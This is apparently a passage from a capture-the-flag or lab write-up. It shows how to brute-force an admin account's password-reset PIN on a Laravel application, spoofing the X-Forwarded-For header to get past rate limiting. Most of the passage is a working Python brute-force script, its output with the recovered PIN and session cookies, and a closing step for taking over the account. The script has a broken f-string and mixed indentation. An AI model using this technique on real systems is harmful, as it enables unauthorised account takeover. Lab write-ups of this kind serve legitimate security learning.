## Brute Forcing Admin's PIN

Iterative attempts to brute force `admin`'s reset password PIN indicate the application implements some sort of rate limiting protection. However, the Laravel web application functions through an Nginx reverse proxy. Since it is proxy aware, it appears to be possible to bypass the rate limiting by using the `X-Forwarded-For` HTTP header and changing its value to a new IP address each time the rate limiting kicks in. The following Python script does this, returning the PIN and the HTTP cookies required to change the password.

```python
import random
import time

from bs4 import BeautifulSoup
import requests


def gen_x_forwarded_for() -> str:
   i = random.randint(0, 254)
   return f"127.0.0.{i}"


with requests.Session() as session:

	# Grab reset password form CSRF
    response = session.get("http://10.129.227.109/reset")
    assert response.status_code == 200
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "_token"})["value"]
    assert token is not None

	# Submit reset password form for admin user
    response = session.post(
        "http://10.129.227.109/reset",
        data={
            "_token": token,
            "name": "admin"
        }
    )
    assert "Invalid Username" not in response.text

	# Brute force reset password PIN
    x_forwarded_for = gen_x_forwarded_for()
    for i in range(10000):
        pin = str(i).zfill(4)
        response = session.post(
            "http://10.129.227.109/api/resettoken",
            headers={"X-Forwarded-For": x_forwarded_for},
            data={
                "name": "admin",
                "pin": pin
            }
        )

        if response.status_code == 429:
            x_forwarded_for = gen_x_forwarded_for()
            response = session.post(
                "http://10.129.227.109/api/resettoken",
                headers={"X-Forwarded-For": x_forwarded_for},
                data={
                    "name": "admin",
                    "pin": pin
                },
                proxies={"http": "http://127.0.0.1:8080"}
            )

        elif "Invalid Pincode" not in response.text:
            print(f"[*] Valid PIN: {pin}")
			print(f"[*] Cookies: {session.cookies})
            break
```

```bash
$ python3 brute-force-pin.py
[*] Valid PIN: 1055
[*] Cookies: <RequestsCookieJar[<Cookie XSRF-TOKEN=eyJpdiI6IjhPUlF2OWVRNkx5c0V1akpRcXlPTkE9PSIsInZhbHVlIjoiTmdrWVdWaDdzRHdpS0ZwbGY4VXlFdGVjUXN3RHBzcytTNFNMd05zcWY5cXNCSGpJcFVQOXlyRjBMYWNxT2JmZnFCRzE3YXdDMDNHVHU4d1c5SVFNTlk2cnRENlVxNTRZT0pBZDdmeVJOdVMxMGlYZlQzdm1QMGQ3V3R5TDF4bjgiLCJtYWMiOiJkM2Y2ZTJkNzI5NDhkOTkxNjFkMDg5MzhiNTIxYmRjOGRlMGJiNjJkZTVmNWQ3OWJiYzMxODM5YzQxYzUxM2MyIiwidGFnIjoiIn0%3D for 10.129.53.183/>, <Cookie laravel_session=eyJpdiI6ImtWKzNMQ2FWaVFpcE04c2ZZaWVac0E9PSIsInZhbHVlIjoiUjQvalZvTDg2Rzd6Q3lMeHhLZkc1L3hWZnYzejhvL2JadytOa1hRelNDZEpWQm0zYSsvb1J5OXFkU0FLSzFsWWVzaERrVElxVmtNNzJ2UlNWaGwzT2I5THpVQmlBNXlBejY1RjZDSXdIMHJjUWdPdFlUMzZSdHBUb09xTkExTE8iLCJtYWMiOiI1MWY1ODFhMTEwZGE1YWNkMjJhZmNiZjk4MTllYjU5NzVkZDQzNmM2N2UyOWQ1MjI3MjNiMzdhNWExM2FiYTQ1IiwidGFnIjoiIn0%3D for 10.129.53.183/>]>
```

Navigate to `/reset` and insert the two cookies into your session. Enter the PIN.

